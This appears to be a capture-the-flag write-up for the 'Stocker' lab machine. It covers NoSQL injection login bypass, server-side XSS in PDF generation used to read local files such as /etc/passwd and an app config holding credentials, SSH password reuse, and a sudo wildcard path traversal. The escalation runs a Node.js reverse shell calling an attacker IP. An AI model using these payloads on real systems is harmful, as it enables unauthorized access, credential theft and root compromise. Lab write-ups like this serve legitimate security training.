# Stocker - Easy

```sh
sudo vim /etc/hosts
# add stocker.htb

nmap -T4 -p- -A -Pn -v stocker.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
    * 80/tcp - http - nginx 1.18.0

* the webpage on port 80 is a standard corporate webpage; the site mentions that it is under development

* the website also gives us a name of an employee - 'Angoose Garden'

* web enumeration:

    ```sh
    gobuster dir -u http://stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 25
    # dir scan

    ffuf -c -u 'http://stocker.htb' -H 'Host: FUZZ.stocker.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 178 -s
    # subdomain scan

    gobuster dir -u http://dev.stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 25
    # enumerate 'dev' subdomain
    ```

* subdomain scan by ```ffuf``` gives us a domain 'dev.stocker.htb' - add this entry to ```/etc/hosts```

* checking this subdomain, we get a login page at 'http://dev.stocker.htb/login' - the webpage is using Express framework (NodeJS)

* trying common creds like 'admin:admin' do not help, and the error messages in this case also do not show if the username is valid or not

* ```gobuster``` scan for the 'dev' subdomain gives pages like '/stock' and '/static' - but this redirects to the login page

* we can test for parameter fuzzing:

    ```sh
    ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u 'http://dev.stocker.htb/login?error=FUZZ' -fs 2667 -s
    # fuzz for values of 'error' parameter

    ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://dev.stocker.htb/login?error=FUZZ' -fs 2667 -s

    ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -u 'http://dev.stocker.htb/login?error=FUZZ' -fs 2667 -s

    ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://dev.stocker.htb/login?FUZZ=value' -fs 2667 -s
    ```

* parameter fuzzing does not give anything; we can test next for injection attempts - intercept a login request in Burp Suite

* the login request is a POST call to '/login' with the data format "username=admin&password=admin"

* SQLi attempts using ```'``` and ```"``` does not give any different response; ```sqlmap``` can also be used but this does not give anything

* Googling for Express frameworks shows that it can also use NoSQL DBs like MongoDB for backend, so we can check for [NoSQL injection payloads with respect to login forms](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md#authentication-bypass)

* the payload options include HTTP and JSON data - we can test for both types of NoSQLi payloads via Burp Suite:

    * HTTP data:

        * in the intercepted request, test the following payloads:

            ```js
            username[$ne]=admin&password[$ne]=pass
            username[$regex]=admin.*&password[$ne]=pass
            username[$gt]=admin&password[$ne]=1
            username[$nin][]=admin&password[$ne]=pass
            ```
        
        * all of these redirect to '/login?error=login-error'
    
    * JSON data:

        * in the intercepted request, we can change the header 'Content-Type' to have the value 'application/json' before testing with JSON data

        * we can first test if that works using a normal payload like ```{"username": "admin", "password": "pass"}``` - this redirects to '/login?error=login-error'

        * then we can test the following payloads:

            ```js
            {"username": {"$ne": null}, "password": {"$ne": null}}
            {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
            {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
            {"username": {"$gt":""}, "password": {"$gt":""}}
            ```
        
        * the JSON NoSQLi payloads like ```{"username": {"$ne": null}, "password": {"$ne": null}}``` and ```{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}``` work and the response is redirecting to '/stock'

* using one of the JSON NoSQL injection payloads, we can intercept a valid login request, change the header to 'Content-Type: application/json', and use the working payload to bypass authentication and access '/stock'

* this page has a few products that we can purchase and add to a cart - we can add a few items to test the webpage

* checking the source code for '/stock', we get some more info:

    * the products are being fetched using an API call to "/api/products"
    
    * on submitting the purchase, a POST call is done to "/api/order" endpoint with the cart details in a JSON format

    * the purchase order is referred with the endpoint "/api/po/<order-id>"

* continuing to intercept requests in Burp Suite, if we view the cart and submit purchase, we can see a POST call to "/api/order" - the data is having one key "basket", with its value set to JSON data of product details

* on forwarding the request, we get the purchase confirmation with an order ID, and a link to the order details at 'http://dev.stocker.htb/api/po/697a354a1174ce33d47bbe3d'

* this page gives a PDF file with the purchase order details with each product mentioned - the name 'Angoose' is mentioned as the 'purchaser', and an email 'support@stock.htb' is mentioned

* analyzing the request to the '/api/po/<order-id>' endpoint in Burp Suite Repeater, the response shows some more info about the PDF:

    * PDF-1.4 is mentioned
    * creator is 'Chromium'
    * producer is 'Skia/PDF m108'

* Googling for 'Skia/PDF m108' does not give any exploits in particular, but it shows that Skia PDF is used for PDF document creation in Chromium browser

* using the given hint, Googling for injection attacks associated with PDFs leads to [this HackTricks post on server side XSS in dynamic PDF generation](https://angelica.gitbook.io/hacktricks/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)

* the post mentions that these server-side injection attacks can be attempted when PDF is created using user-controlled input

* in this case, the input for the PDF can be controlled in the POST request to '/api/order' - when the 'submit purchase' option is selected - and the JSON data includes the product title, which is rendered in the purchase order PDF later

* we can test some of the payloads from the server-side injection blog in the "title" parameter's value of the JSON data, in the "basket" key - test in Burp Suite Repeater:

    ```js
    "title":"<img src='x' onerror='document.write('test')' />"

    "title":<script> document.write(window.location) </script>
    
    "title":"<script> document.write(window.location) </script>"
    ```

    * intercepting the response to some of the payloads without quotes gives 400 Bad Request, but it also discloses the file paths ```/var/www/dev/node_modules/raw-body/index.js``` and ```/var/www/dev/node_modules/body-parser/lib/read.js```

    * testing the payload ```"title":"<script> document.write(window.location) </script>"``` gives us a 200 response with the order id; if we check the PDF generated at '/api/po/<order-id>', we are able to see the file path injected as ```/var/www/dev/pos/<order-id>.html```

* therefore, server-side injection is confirmed; we can use payloads specific for reading local files via SSRF:

    ```js
    "title":"<iframe src=file:///etc/passwd></iframe>"

    "title":"<iframe src=file:///etc/passwd width='1500' height='1500'></iframe>"
    ```

    * the payload ```<iframe src=file:///etc/passwd></iframe>``` works, but the "iframe" tag is clipped, due to which we are unable to read the complete file

    * we can specify width & height parameters in the "iframe" tags so that the complete file can be read

    * ```/etc/passwd``` file read shows only one user on the box - 'angoose'

    * trying to read files like ```/home/angoose/.ssh/id_rsa``` and ```/home/angoose/.ssh/authorized_keys``` does not give anything in the PDF

    * we can try to read known files from the previous errors - ```/var/www/dev/node_modules/raw-body/index.js``` and ```/var/www/dev/node_modules/body-parser/lib/read.js``` - but this also does not give anything, and we cannot read the complete content due to size limitations (if we use a higher height/width value, the page fails to load)

    * we can check for common files in the base directory ```/var/www/dev```, like ```index.html``` and ```index.js``` (with respect to NodeJS apps)

    * the ```/var/www/dev/index.js``` file leaks the creds 'dev:IHeardPassphrasesArePrettySecure' used for the MongoDB connection

* while there is no user 'dev' on the box, we have 'angoose' user, so we can try password re-use via SSH:

    ```sh
    ssh angoose@stocker.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    # (ALL) /usr/bin/node /usr/local/scripts/*.js
    ```

* ```sudo -l``` shows that this user can run ```/usr/bin/node /usr/local/scripts/*.js``` as root - we can check how to abuse this:

    ```sh
    ls -la /usr/local

    ls -la /usr/local/scripts
    ```

* there are a few scripts in ```/usr/local/scripts``` like 'creds.js' and 'schema.js', but we do not have read-write access to the scripts; there is a subfolder 'node_modules', but this does not have anything interesting

* however, as the ```sudo -l``` entry uses a wildcard character ```*```, we can run any JS file with ```/usr/bin/node``` as long as the path starts with ```/usr/local/scripts/```:

    ```sh
    sudo /usr/bin/node /usr/local/scripts/node_modules/../creds.js
    # runs the script, but no output

    sudo /usr/bin/node /usr/local/scripts/*.js
    # runs all scripts, but still no output
    ```

* simply running the scripts did not help, so we can try to run a malicious JS file to get reverse shell as root - refer the 'node.js' payload from [revshells.com](https://www.revshells.com/):

    ```js
    (function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("sh", []);
        var client = new net.Socket();
        client.connect(4444, "10.10.14.40", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application from crashing
    })();
    ```

    ```sh
    cd

    vim test.js
    # paste the payload
    ```

    ```sh
    nc -nvlp 4444
    # setup listener on attacker
    ```

    ```sh
    # on target

    sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/test.js
    # this works and we get reverse shell
    ```

    ```sh
    # in reverse shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
